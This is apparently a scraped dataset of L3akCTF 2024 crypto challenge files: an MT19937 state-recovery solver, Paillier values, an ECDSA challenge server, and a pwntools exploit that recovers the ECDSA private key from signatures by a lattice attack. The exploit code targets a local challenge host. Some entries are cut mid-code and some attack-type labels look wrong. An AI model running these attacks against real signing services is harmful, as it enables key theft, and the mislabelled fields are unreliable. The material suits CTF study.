print(\"solving...\")\n\n    result = list(map(int, solver.solve()))\n\n    rng = random.Random()\n    rng.setstate((3,tuple(result+[624]),None))\n    \n    for i in range(2*32 + 2*remaining):\n        rng.getrandbits(32)\n    key = rng.getrandbits(128).to_bytes(16, byteorder=\"little\")\n    myiv = rng.getrandbits(128).to_bytes(16, byteorder=\"little\")\n    print(\"Compare\", myiv.hex().encode(), iv)\n    aes = AES.new(key, mode=AES.MODE_CBC, iv=myiv)\n    plaintext : bytes = aes.decrypt(bytes.fromhex(ct.decode()))\n    print(plaintext)\n\nmain()\n", "solution_code": "    solver = MT19937Solver()\n    #r = pwn.process([\"python3\",\"quantum.py\"])\n    #print(r.recv())\n    r.recvuntil(b\"Choice: \")\n\n\n    r.recvuntil(b\"ct: \")\n    ct = r.recvline()[:-1]\n    r.recvuntil(\"iv: \")\n    iv = r.recvline()[:-1]\n    r.close()\n    print(\"ct\", ct)\n    print(\"iv\", iv)\n    print(\"solver observed:\", len(solver.observed))\n    print(\"solving...\")\n\n\n    for i in range(2*32 + 2*remaining):\n        rng.getrandbits(32)\n    key = rng.getrandbits(128).to_bytes(16, byteorder=\"little\")\n    myiv = rng.getrandbits(128).to_bytes(16, byteorder=\"little\")\n    print(\"Compare\", myiv.hex().encode(), iv)\n    aes = AES.new(key, mode=AES.MODE_CBC, iv=myiv)\n    plaintext : bytes = aes.decrypt(bytes.fromhex(ct.decode()))\n    print(plaintext)\n", "tools": [], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\QuantumL3ak\\solution\\solver.py", "file_size": 3344, "scraped_at": "2025-10-26T18:20:14.214307"}
{"id": "l3ak-team_L3akCTF-2024-public_Provided_values", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "Provided values", "attack_type": "AES", "writeup": "#!/usr/bin/env python3\nfrom sage.all import *\n\nfrom random import randint\nfrom Crypto.Util.number import *\nCiphertext1 = 0x14060da59e64dc74087b911f612d2c45d8253cb3d7cb322b3aea545b05460880b7c5cd99cdaad15d2bf7b92a5315c9cf6e1c962ebb1100e1b9d0b5f768419069cb4e53281c15d8a432f90ad33c6a3680c7a56df8680bf22765b4b5977bc30cdb49ea1dab83694268bf6869dcd587a8be2475330c339d441e8ce254559c3fe5e2b0296dd0239924e318d86b4c9f2babd2b49bf103fb6cc340e0bffe0dac3fda06aeb1e763f9d6713d62aee4aa9b7806b9dd1f311a528cd9531d997dfe31190f457af2576a79e4f873da57a28da763e07037dd6c7d14ef978bdcb857c7559ebe774c8db2ca34fc5841df1362ae768db89690216594c48ef23bd131618c3978a3bb36d420907947d862490376e20a9af43583960641b37a5733ee4082f8eb750d30eb8177e8af1d2589785b81d7e74c9ad386ef8280bc6c0d275bb95bb0cffd8b3e73db2e438880ff2f7bdd2bdfc0c8f3ee5265196d11eb9e4f5db8d643d5dc2d7c5372bad82d62cd2966ce033c5c609db288ef8484a664f4e33d19ce218ced0e7f46256c41d827813f4cb65425240762cc6e1c87421ff851c50f0c011e39655640bf3b8db0f43cb5ed93fb1967209d446d996c29abd76fa952fe31050b85d0e350dddc924421c3606d686e72d5764e0a596c95607ecb92a7cc7fe8c8b031e2877774f7df1e842107a4048306449ca7d66eb0cbfcd13b6b6cd3e2ae719b8e20530\nCiphertext2 = 0x50258985886970e93e6b0105d26e42efe033a8216f721eaf981f89e9287b04ddfe5f16d3f6fcef6e814376c266e6738b29e47eb70b97fa9ff03e0e29e17d32d131550b94df94b7484f73592ecd15848594e9fc93e3401848b437bd6a8c67159c5410a32eebeab7285365ea69bfeeaaef975af1dd55c250bc30c709cdc631aa678f7e2795c6c5d66187974de4c6bfb30da14a9f9a91fcac9eccb463196d621ecdbeda28d682401c960a2dca58730766a6cecb83630ca92523b5bdd7c97019adc1754d0598d082cf51337e434bd2683d70ca074c276dc0e386a3a9a9ef189eff84a2acbdd7c1891c113589244d41d541dbc7a88639ab05b3c57cdd8fdfdbc7d3a9619bb8b0db85ce3e66640d2e1821da55ebdfb09e73230a08ad49d72707d4639763c8196568eb5654466743dd66c6cf37fafc97004aa0c063f54b145fb8d33dea6eb371af6e66d3e6fb3fa082712b5e4ad70580808fd650cc056aa17a88cc4ad0387701237f81a7039071aac653314a7dfe6fccd2b1e87cdf43832425a97ff9c5383133b6e984d9fb2132a80ee9b05cc7a2a493f9bc2197ba940826cdedd667a515d1554539eabc1ebdc9dd2075b80f98fa5e125a78891e64eb57f5e5eba97200d5c76f5d49646eda8671f5d289c1f8ca7c5033466b636052f10fbf0026c3c15f19b805271f9322a1c674cc33f69b725feb8a9087c05cc490c63fb467f499d9f\nModifiedFlagCipher = 0x410f09e83a921ff2e06f9af688d56962be6b6db5472d84c802c89505bc80dcb06f09fba8cea712f3bd0af654b1e9c7010a20fe4bee9537c3e44771b90547103f9a313df10de3df68862c98ce7bfff47dc0547b65867b0990fd9ac496bf8e5df6c4fc8ad2ad074fb5083532dbb1f2373b9183770e2fda35498fa1753bb8ec4b1fcf80f100ae20eb8e865ef80e46435f75ec998af6cebb64717d76af38f926470207b8753bd94c0e55d7eaf7a5c352d718feead815aa886e585865c812f840da04fa24f411fc5917efcfc7549a41a22aed031842309709d93eb4818c62a00614f0ac13ac909454cb56780658d6188f813ba77ae52b76b2979423d9e62118a17114b8572a3219fda1e9399d91249fbb32b4e06615ce91de513f14231f42fe6b1e27027a22841554399b5c699a68dd308f0d11ed00580d703e9ea61710378b06bf3e55a4c6405e523184a3f4f9838c06ee650c7002b69106c8d7569c7f0628093fe61acbd2ce52654f6ebed132789daba9b26b989e3c6283326dec6c63df9ecfb60620cac002e680691d3cb8e4b4139596973a333eb5942f8512919e6b338631675c2c9ab58115aeaee009870a2a3d121c16574476211cdac81b78618f101315c694005ab7478546538e43559c3d29fb9508a1ca5a6e7afc046d0b450165f34ed611156ab9485adffd118013f8477ed8b7cf95f9008d0f140226644c99920af5633\nPublicKey = 0x250fb952a1b9ed84701fa2fe7b90615e4144635d26a566231e2eeefae591c74fdf8a775425cf26ee84b48460417ff1859f4279c703258b325e7196656293c9225db58a9b6054fa83a2e44fc00eb058dd3e1660fbdc79cfd427aa90b0e0efdc40e02753c715ea9e7de1f282554d99c22ba883ca433577f8eac31dcfa55117c933cb69c969d91065a5276eb07e81caaf4fb332cc0f40cf5c049b8e8c78288f7b7a7d71fc5e1dba03eab6359bca909157e8a422c03ec852ae8b6fd8eaf7a37b2e3b680448f42724a3431aa73df3debdc052791ee2d0d57499fa2f1a21cb10bfdd14c148545d59fb7c90b679d44d4ad298ea6e15f4782faf9c53b8c3cda7536f11a5, 0x250fb952a1b9ed84701fa2fe7b90615e4144635d26a566231e2eeefae591c74fdf8a775425cf26ee84b48460417ff1859f4279c703258b325e7196656293c9225db58a9b6054fa83a2e44fc00eb058dd3e1660fbdc79cfd427aa90b0e0efdc40e02753c715ea9e7de1f282554d99c22ba883ca433577f8eac31dcfa55117c933cb69c969d91065a5276eb07e81caaf4fb332cc0f40cf5c049b8e8c78288f7b7a7d71fc5e1dba03eab6359bca909157e8a422c03ec852ae8b6fd8eaf7a37b2e3b680448f42724a3431aa73df3debdc052791ee2d0d57499fa2f1a21cb10bfdd14c148545d59fb7c90b679d44d4ad298ea6e15f4782faf9c53b8c3cda7536f11a6\nPrivateKey = 0x250fb952a1b9ed84701fa2fe7b90615e4144635d26a566231e2eeefae591c74fdf8a775425cf26ee84b48460417ff1859f4279c703258b325e7196656293c9225db58a9b6054fa83a2e44fc00eb058dd3e1660fbdc79cfd427aa90b0e0efdc40e02753c715ea9e7de1f282554d99c22ba883ca433577f8eac31dcfa55117c933057d339c308438050366c6b40808a18b4448dfe495c06abe52abdaaeb86381c86a14ad5d91ff1b25aaf1e82d0e429c8622cd435389169a066357ef488c1725ec0812d3a8edd7bc93d5ac7344c074169dbfd52949913cb9779ce1f7aab96b9a8a554fb17493075a862ab37d30ea4fe91e5ee6f9b95e280b297e91357454800c60, 0x21c0ff97d130be489dd28344be8a9022b1ecbca51a8555c52e3512f65786623289f7effbda90d9e52e3066af88464b5157984983fdbd4a0a60eea984bb427230d6f4e0de54954ccc8efc58127b58fb02fed0ea47f4bd28072be2e02fa58abf65", "solution_code": "    def __init__(self, bits):\n        self.bits = bits\n        self.pub, self.priv = self.keygen()\n\n\n    def keygen(self):\n        p = random_prime(2**self.bits)\n        q = random_prime(2**self.bits)\n        Lambda = (p - 1) * (q - 1)\n        n = p * q\n        Zn = IntegerModRing(n)\n        Zn2 = IntegerModRing(n**2)\n        g = Zn2(n + 1)\n        mu = Zn(Lambda)**-1\n        return ((n, g), (Lambda, mu))\n\n\n    def encrypt(self, m):\n        (n, g) = self.pub\n        Zn2 = IntegerModRing(n**2)\n        r = Zn2(randint(0, n))\n        c = g**Zn2(m) * r**n\n        return c\n\n\n    def add(self, cipher_1, cipher_2):\n        (n, g) = self.pub\n        Zn2 = IntegerModRing(n**2)\n        r = Zn2(randint(0, n))\n        return cipher_1 * cipher_2 * r**n\n\n\n    def sub(self, cipher_1, cipher_2):\n        (n, g) = self.pub\n        Zn2 = IntegerModRing(n**2)\n        r = Zn2(randint(0, n))\n        inv_cipher_2 = Zn2(cipher_2)**-1\n        return cipher_1 * inv_cipher_2 * r**n\n\n\n    def get_keys(self):\n        return self.pub, self.priv\n", "tools": ["sage", "pycryptodome", "radare2"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\paillien-tourist\\solution\\solve.py", "file_size": 12355, "scraped_at": "2025-10-26T18:20:14.301806"}
{"id": "l3ak-team_L3akCTF-2024-public_chal", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "chal", "attack_type": "AES", "writeup": "from sage.all import *\nfrom typing import Tuple\nimport hashlib\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.number import long_to_bytes\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Random import get_random_bytes\nimport re\np = 0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\nK = GF(p)\na = K(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc)\nb = K(0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00)\nE = EllipticCurve(K, (a, b))\nG = E(0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66, 0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650)\nE.set_order(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409 * 0x1)\nn = G.order()\n\n\nFLAG: str = open('flag.txt', 'r').read().strip()\nKEY: int = randint(1, n - 1)\nQ: int = KEY*G\nAES_KEY = hashlib.sha256(long_to_bytes(KEY)).digest()\n\nINVALID_ATTEMPTS = 0\n\ndef banner() -> str:\n    banner = \"\"\"\\n\n██████████╗░░█████╗░░█████╗░███████╗█\n[=] ------------ Menu------------ [=]\n[+] !1: Get Public Key            [+]\n[+] !2: Sign a message            [+]\n[+] !3: Verify a signature        [+]\n[+] !4: Get the encrypted flag    [+]\n[+] !5: Exit                      [+]\n[=] ------------------------------[=]\n██████████╗░░█████╗░░█████╗░███████╗█\n\\r\\n\"\"\"\n    return banner\ndef get_k() -> int:\n    return int.from_bytes(hashlib.sha512(os.urandom(512//8)).digest(), byteorder='big') % n\n\ndef digest(msg) -> int:\n    if isinstance(msg, str):\n        msg = msg.encode()\n    return int.from_bytes(hashlib.sha256(msg).digest(), byteorder='big')\n\n\ndef ecdsa_verify(Q, m, r, s) -> bool:\n    e = digest(m)\n    w = pow(s, -1, n)\n    u1 = int((e * w) % n)  \n    u2 = int((r * w) % n)  \n    P = (u1 * G) + (u2 * Q)\n    return r == int(P.xy()[0])\n\n\ndef ecdsa_sign(d: int, m: str) -> Tuple[int, int]:\n    e = digest(m)\n    k = get_k()\n    P = k * G\n    r_i = int(P.xy()[0])\n    s_i = (pow(k, -1, n) * (e+r_i*d)) % n\n    return (r_i, s_i)\n\ndef send_flag() -> str:\n        flag = FLAG.encode()\n        iv = get_random_bytes(16)\n        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)\n        ct = cipher.encrypt(pad(flag, AES.block_size))\n        return (iv + ct).hex()\n\ndef handle_signing() -> tuple:\n    while True:\n        try:\n            inp = input(\"Enter message to sign. (`!exit`) to return to the main menu.\\n\\n>> \")\n            if inp == \"!exit\":\n                break\n            r,s = ecdsa_sign(KEY, inp)\n            print(f\"Signature (r,s): {(r, s)}\")\n            \n        except Exception as e:\n            print(f\"Error during signing: {e}\")\n            continue\n\ndef is_valid_format(inp) -> bool:\n    pattern = r\"^\\([^,]+,\\d+,\\d+\\)$\"\n    match = re.match(pattern, inp)\n    return bool(match)\n\ndef handle_verfication():\n    while True:\n        inp = input(\"Enter the message you want to verify in the format `message,r,s` (`!exit` to return to the main menu).\\n\\n>> \")\n        if inp == '!exit':\n            break\n        valid = is_valid_format(inp)\n        if not valid:\n            print(\"Invalid input format. Please try again.\\n\")\n            continue\n        message, r, s = inp.split(',')\n        print(f\"message: {message}\\nr: {r}\\ns: {s}\\n\")\n        try:\n            i_r, i_s = int(r), int(s)\n            valid = ecdsa_verify(Q, message, i_r, i_s)\n            result = \"Signature is valid\\n\" if valid else \"Signature is invalid\\n\"\n            print(result)\n        except Exception as e:\n            print(f\"Error during verification: {e}\")\n            continue\n        \n\n\ndef process_option(option: str) -> str:\n    global INVALID_ATTEMPTS\n    if option == '!1':\n        INVALID_ATTEMPTS = 0\n        public_key_info = f\"Public Key (X, Y): {Q.xy()}\\n\"\n        print(public_key_info)\n    elif option == '!2':\n        INVALID_ATTEMPTS = 0\n        handle_signing()\n    elif option == '!3':\n        INVALID_ATTEMPTS = 0\n        handle_verfication()\n    elif option == '!4':\n        INVALID_ATTEMPTS = 0\n        enc_flag = send_flag()\n        print(f\"Encrypted Flag: {enc_flag}\\n\")\n    elif option == '!5':\n        print(\"Goodbye!\\n\")\n        return False\n    else:\n        INVALID_ATTEMPTS += 1\n        print(\"Invalid option... Try again\\n\")\n        if INVALID_ATTEMPTS >= 3:\n            print(\"Too many invalid attempts. Exiting.\\n\")\n            return False\n    return True\n        \n\n\n\ndef main():\n    try:\n        b = banner()\n        print(b+\"\\n\")\n        while True:\n            \n            inp = input(\">> \")\n            if not process_option(inp):\n                sys.exit(0)\n    except Exception as e:\n        print(f\"An error occurred: {e}, please", "solution_code": "    while True:\n        try:\n            inp = input(\"Enter message to sign. (`!exit`) to return to the main menu.\\n\\n>> \")\n            if inp == \"!exit\":\n                break\n            r,s = ecdsa_sign(KEY, inp)\n            print(f\"Signature (r,s): {(r, s)}\")\n            \n        except Exception as e:\n            print(f\"Error during signing: {e}\")\n            continue\n\n\n    while True:\n        inp = input(\"Enter the message you want to verify in the format `message,r,s` (`!exit` to return to the main menu).\\n\\n>> \")\n        if inp == '!exit':\n            break\n        valid = is_valid_format(inp)\n        if not valid:\n            print(\"Invalid input format. Please try again.\\n\")\n            continue\n        message, r, s = inp.split(',')\n        print(f\"message: {message}\\nr: {r}\\ns: {s}\\n\")\n        try:\n            i_r, i_s = int(r), int(s)\n            valid = ecdsa_verify(Q, message, i_r, i_s)\n            result = \"Signature is valid\\n\" if valid else \"Signature is invalid\\n\"\n            print(result)\n        except Exception as e:\n            print(f\"Error during verification: {e}\")\n            continue\n        \n\n\n    global INVALID_ATTEMPTS\n    if option == '!1':\n        INVALID_ATTEMPTS = 0\n        public_key_info = f\"Public Key (X, Y): {Q.xy()}\\n\"\n        print(public_key_info)\n    elif option == '!2':\n        INVALID_ATTEMPTS = 0\n        handle_signing()\n    elif option == '!3':\n        INVALID_ATTEMPTS = 0\n        handle_verfication()\n    elif option == '!4':\n        INVALID_ATTEMPTS = 0\n        enc_flag = send_flag()\n        print(f\"Encrypted Flag: {enc_flag}\\n\")\n    elif option == '!5':\n        print(\"Goodbye!\\n\")\n        return False\n    else:\n        INVALID_ATTEMPTS += 1\n        print(\"Invalid option... Try again\\n\")\n        if INVALID_ATTEMPTS >= 3:\n            print(\"Too many invalid attempts. Exiting.\\n\")\n            return False\n    return True\n        \n\n\n    try:\n        b = banner()\n        print(b+\"\\n\")\n        while True:\n            \n            inp = input(\">> \")\n            if not process_option(inp):\n                sys.exit(0)\n    except Exception as e:\n        print(f\"An error occurred: {e}, please try again later.\\n\")\n        pass\n", "tools": ["sage", "pycryptodome"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\crypto-on-the-rocks\\dist\\chal.py", "file_size": 5121, "scraped_at": "2025-10-26T18:20:14.321481"}
{"id": "l3ak-team_L3akCTF-2024-public_exploit", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "exploit", "attack_type": "AES", "writeup": "from pwn import *\nfrom sage.all import *\nimport hashlib\nfrom utils import PartialInteger, attack, dsa_known_msb, check_public_key, curve\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nimport hashlib, re\nfrom Crypto.Util.number import long_to_bytes, bytes_to_long\nimport sys\np = 0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\nK = GF(p)\na = K(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc)\nb = K(0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00)\nE = EllipticCurve(K, (a, b))\nG = E(0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66, 0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650)\nE.set_order(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409 * 0x1)\nn = G.order()\nDEFAULT_HOST,DEFAULT_PORT = '172.17.0.2', 1337\nhost = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST\nport = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT\nn_sigs = int(sys.argv[3]) if len(sys.argv) > 3 else 100\ndef hasher(m):\n    hashed = int.from_bytes(hashlib.sha256(m.encode()).digest(), byteorder='big')\n    return hashed\n\ndef parse_sig(input_string):\n    pattern = r\"Signature \\(r,\\s*s\\):\\s*\\((\\d+),\\s*(\\d+)\\)\"\n    match = re.search(pattern, input_string)\n    if match:\n        r = int(match.group(1))\n        s = int(match.group(2))\n        return (r, s)\n    else:\n        return None\n\ndef parse_pub(s):\n    x = int(re.findall(r\"Public Key \\(X, Y\\): \\((\\d+),\", s)[0])\n    y = int(re.findall(r\"Public Key \\(X, Y\\): \\(\\d+, (\\d+)\\)\", s)[0])\n    return (x, y)\n\ndef get_pub(r):\n    r.recvuntil(b\">> \")\n    r.sendline(b\"!1\")\n    pub = r.recvline().strip().decode()\n    xy_pub = parse_pub(pub)\n    print(f\"[+] Public Key Received: {xy_pub} [+]\")\n    return xy_pub, pub\n\ndef get_sigs(n, r):\n    sigs = []\n    r.recvuntil(b\">> \")\n    r.sendline(b'!2')\n    for i in range(n):\n        r.recvuntil(b\">> \")\n        r.sendline(b\"message\")\n        sig_line = r.recvline().strip().decode()\n        parsed_sig = parse_sig(sig_line)\n        if parsed_sig:\n            sigs.append(parsed_sig)\n        else:\n            print(f\"[-] Failed to parse signature: {sig_line} [-]\")\n    r.sendline(b\"!exit\")\n    print(f\"[+] Total Parsed Signatures: {len(sigs)} [+]\")\n    return sigs\n\ndef get_flag(r):\n    r.recvuntil(b\">> \")\n    \n    r.sendline(b\"!4\")\n    dat = r.recv(1024).strip().decode()\n    stripped = re.findall(r\"Encrypted Flag: ([a-f0-9]+)\", dat)\n    print(dat)\n    print(f\"[+] Received Encrypted Flag: {stripped} [+]\")\n    if len(stripped) == 0:\n        r.recvuntil(b\">> \")\n        r.sendline(b\"!4\")\n        dat2 = r.recvline().strip().decode()\n        print(dat2)\n        stripped = re.findall(r\"Encrypted Flag: ([a-f0-9]+)\", dat2)[0]\n        print(f\"[+] Received Encrypted Flag: {stripped} [+]\")\n    return stripped\ndef decrypt_flag(ciphertext, key):\n    ciphertext = bytes.fromhex(ciphertext)\n    iv = ciphertext[:16]\n    ciphertext = ciphertext[16:]\n    cipher = AES.new(key, AES.MODE_CBC, iv)\n    return unpad(cipher.decrypt(ciphertext), AES.block_size)\ndef main(n_sigs:int):\n    r = remote(host, port)\n    print(\"[+] Connection established with the server. [+]\")\n    try:\n        s_i, r_i, k_i, h_i = [], [], [], []\n        msg = \"message\"\n        hashed = hasher(msg)\n        pub, _ = get_pub(r)\n        sigs = get_sigs(n_sigs, r)\n        flag = get_flag(r)\n        ks = PartialInteger.from_bits_be(\"000000000\"+(\"?\"*512))\n        for r_s, s in sigs:\n            r_s_i = str(r_s).replace(\",\", \"\")\n            s_i.append(int(s))\n            r_i.append(int(r_s_i))\n            k_i.append(ks)\n            h_i.append(hashed)\n        print(f\"[+] Arrays lengths -> h_i: {len(h_i)}, r_i: {len(r_i)}, s_i: {len(s_i)}, k_i: {len(k_i)} [+]\")\n        \n        for d_, _ in dsa_known_msb(n, h_i, r_i, s_i, k_i):\n            if check_public_key(int(d_), curve, pub[0], pub[1]):\n                print(\"[+] Success: Correct private key found. [+]\")\n                print(f\"[+] Private Key: {d_} [+]\")\n                print(f\"[+] AES_KEY: {hashlib.sha256(long_to_bytes(int(d_))).hexdigest()} [+]\")\n                dec_flag = decrypt_flag(flag, hashlib.sha256(long_to_bytes(int(d_))).digest())\n                print(f\"[+] Decrypted Flag: {dec_flag.decode()} [+]\")\n                print(\"/[+]\\\\After 100 signatures, private key has been successfully recovered and the flag decrypted /[+]\\\\\")\n                break\n            else:\n                print(\"Unsuccessful attack on attempt #\")\n    finally:\n        r.close()\n        print(\"Connection closed.\")\n\nif __name__ == \"__main__\":\n    main(n_sigs)\n", "solution_code": "    r.recvuntil(b\">> \")\n    r.sendline(b\"!1\")\n    pub = r.recvline().strip().decode()\n    xy_pub = parse_pub(pub)\n    print(f\"[+] Public Key Received: {xy_pub} [+]\")\n    return xy_pub, pub\n\n\n    sigs = []\n    r.recvuntil(b\">> \")\n    r.sendline(b'!2')\n    for i in range(n):\n        r.recvuntil(b\">> \")\n        r.sendline(b\"message\")\n        sig_line = r.recvline().strip().decode()\n        parsed_sig = parse_sig(sig_line)\n        if parsed_sig:\n            sigs.append(parsed_sig)\n        else:\n            print(f\"[-] Failed to parse signature: {sig_line} [-]\")\n    r.sendline(b\"!exit\")\n    print(f\"[+] Total Parsed Signatures: {len(sigs)} [+]\")\n    return sigs\n\n\n    r.sendline(b\"!4\")\n    dat = r.recv(1024).strip().decode()\n    stripped = re.findall(r\"Encrypted Flag: ([a-f0-9]+)\", dat)\n    print(dat)\n    print(f\"[+] Received Encrypted Flag: {stripped} [+]\")\n    if len(stripped) == 0:\n        r.recvuntil(b\">> \")\n        r.sendline(b\"!4\")\n        dat2 = r.recvline().strip().decode()\n        print(dat2)\n        stripped = re.findall(r\"Encrypted Flag: ([a-f0-9]+)\", dat2)[0]\n        print(f\"[+] Received Encrypted Flag: {stripped} [+]\")\n    return stripped\n\n\n    r = remote(host, port)\n    print(\"[+] Connection established with the server. [+]\")\n    try:\n        s_i, r_i, k_i, h_i = [], [], [], []\n        msg = \"message\"\n        hashed = hasher(msg)\n        pub, _ = get_pub(r)\n        sigs = get_sigs(n_sigs, r)\n        flag = get_flag(r)\n        ks = PartialInteger.from_bits_be(\"000000000\"+(\"?\"*512))\n        for r_s, s in sigs:\n            r_s_i = str(r_s).replace(\",\", \"\")\n            s_i.append(int(s))\n            r_i.append(int(r_s_i))\n            k_i.append(ks)\n            h_i.append(hashed)\n        print(f\"[+] Arrays lengths -> h_i: {len(h_i)}, r_i: {len(r_i)}, s_i: {len(s_i)}, k_i: {len(k_i)} [+]\")\n        \n        for d_, _ in dsa_known_msb(n, h_i, r_i, s_i, k_i):\n            if check_public_key(int(d_), curve, pub[0], pub[1]):\n                print(\"[+] Success: Correct private key found. [+]\")\n                print(f\"[+] Private Key: {d_} [+]\")\n                print(f\"[+] AES_KEY: {hashlib.sha256(long_to_bytes(int(d_))).hexdigest()} [+]\")\n                dec_flag = decrypt_flag(flag, hashlib.sha256(long_to_bytes(int(d_))).digest())\n                print(f\"[+] Decrypted Flag: {dec_flag.decode()} [+]\")\n                print(\"/[+]\\\\After 100 signatures, private key has been successfully recovered and the flag decrypted /[+]\\\\\")\n                break\n            else:\n                print(\"Unsuccessful attack on attempt #\")\n    finally:\n        r.close()\n        print(\"Connection closed.\")\n", "tools": ["sage", "pycryptodome"], "file_path": "temp_repos\\l3ak-team_L3akCTF-2024-public\\crypto\\crypto-on-the-rocks\\solution\\exploit.py", "file_size": 4999, "scraped_at": "2025-10-26T18:20:14.340346"}
{"id": "l3ak-team_L3akCTF-2024-public_Source:_https:__github.com_jvdsn_crypto-attacks_blob_master_attacks_hnp_lattice_attack.py", "team": "l3ak-team", "repo": "L3akCTF-2024-public", "challenge_name": "Source: https://github.com/jvdsn/crypto-attacks/blob/master/attacks/hnp/lattice_attack.py", "attack_type": "Hash", "writeup": "from cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.backends import default_backend\nfrom sage.all import matrix, QQ\nimport hashlib\nimport re\nfrom math import log2\ncurve = ec.SECP521R1()\n\ndef parse_pub(inp):\n    try:\n        match = re.search(r\"Public Key \\(X, Y\\): \\((\\d+), (\\d+)\\)\", inp)\n        if match:\n            x = int(match.group(1))\n            y = int(match.group(2))\n            return x, y\n    except Exception as e:\n        return None\ndef parse_sig(data):\n    match = re.search(r'Signature \\(r, s\\): \\((\\d+), (\\d+)\\)', data)\n    #print(data)\n    #print(match)\n    if match:\n        return int(match.group(1)), int(match.group(2))\n    else:\n        return None\n\n\n\ndef hashmsg(m):\n    \"\"\" Hash a message using SHA-256 and return the integer representation. \"\"\"\n    if isinstance(m, str):\n        m = m.encode()\n    return int.from_bytes(hashlib.sha256(m).digest(), byteorder='big')\n\ndef check_public_key(private_int, curve, known_x, known_y):\n    private_key = ec.derive_private_key(private_int, curve, default_backend())\n    public_key = private_key.public_key()\n    public_numbers = public_key.public_numbers()\n    return (public_numbers.x == known_x) and (public_numbers.y == known_y)\n\ndef int_to_openssh(private_int, curve):\n    private_key = ec.derive_private_key(private_int, curve, default_backend())\n    pem = private_key.private_bytes(\n        encoding=serialization.Encoding.PEM,\n        format=serialization.PrivateFormat.OpenSSH,\n        encryption_algorithm=serialization.NoEncryption()\n    )\n    return pem.decode()\ndef shortest_vectors(B):\n    B = B.LLL()\n\n    for row in B.rows():\n        if not row.is_zero():\n            yield row\n\n\n# Source: https://github.com/jvdsn/crypto-attacks/blob/master/attacks/hnp/lattice_attack.py\ndef attack(a, b, m, X):\n    \"\"\"\n    Solves the hidden number problem using an attack based on the shortest vector problem.\n    The hidden number problem is defined as finding y such that {xi = {aij * yj} + bi mod m}.\n    :param a: the aij values\n    :param b: the bi values\n    :param m: the modulus\n    :param X: a bound on the xi values\n    :return: a generator generating tuples containing a list of xi values and a list of yj values\n    \"\"\"\n    assert len(a) == len(b), \"a and b lists should be of equal length.\"\n\n    n1 = len(a)\n    n2 = len(a[0])\n    B = matrix(QQ, n1 + n2 + 1, n1 + n2 + 1)\n    for i in range(n1):\n        for j in range(n2):\n            B[n1 + j, i] = a[i][j]\n\n        B[i, i] = m\n        B[n1 + n2, i] = b[i] - X // 2\n\n    for j in range(n2):\n        B[n1 + j, n1 + j] = X / QQ(m)\n\n    B[n1 + n2, n1 + n2] = X\n\n    for v in shortest_vectors(B):\n        xs = [int(v[i] + X // 2) for i in range(n1)]\n        ys = [(int(v[n1 + j] * m) // X) % m for j in range(n2)]\n        if all(y != 0 for y in ys) and v[n1 + n2] == X:\n            yield xs, ys\n# Source: https://github.com/jvdsn/crypto-attacks/blob/master/attacks/hnp/lattice_attack.py\ndef dsa_known_msb(n, h, r, s, k):\n    \"\"\"\n    Recovers the (EC)DSA private key and nonces if the most significant nonce bits are known.\n    :param n: the modulus\n    :param h: a list containing the hashed messages\n    :param r: a list containing the r values\n    :param s: a list containing the s values\n    :param k: a list containing the partial nonces (PartialIntegers)\n    :return: a generator generating tuples containing the possible private key and a list of nonces\n    \"\"\"\n    assert len(h) == len(r) == len(s) == len(k), \"h, r, s, and k lists should be of equal length.\"\n    a = []\n    b = []\n    X = 0\n    for hi, ri, si, ki in zip(h, r, s, k):\n        msb, msb_bit_length = ki.get_known_msb()\n        shift = 2 ** ki.get_unknown_lsb()\n        a.append([(pow(si, -1, n) * ri) % n])\n        b.append((pow(si, -1, n) * hi - shift * msb) % n)\n        X = max(X, shift)\n\n    for k_, x in attack(a, b, n, X):\n        yield x[0], [ki.sub([ki_]) for ki, ki_ in zip(k, k_)]\n\n# Source: https://github.com/jvdsn/crypto-attacks/blob/master/shared/partial_integer.py\nclass PartialInteger:\n    \"\"\"\n    Represents positive integers with some known and some unknown bits.\n    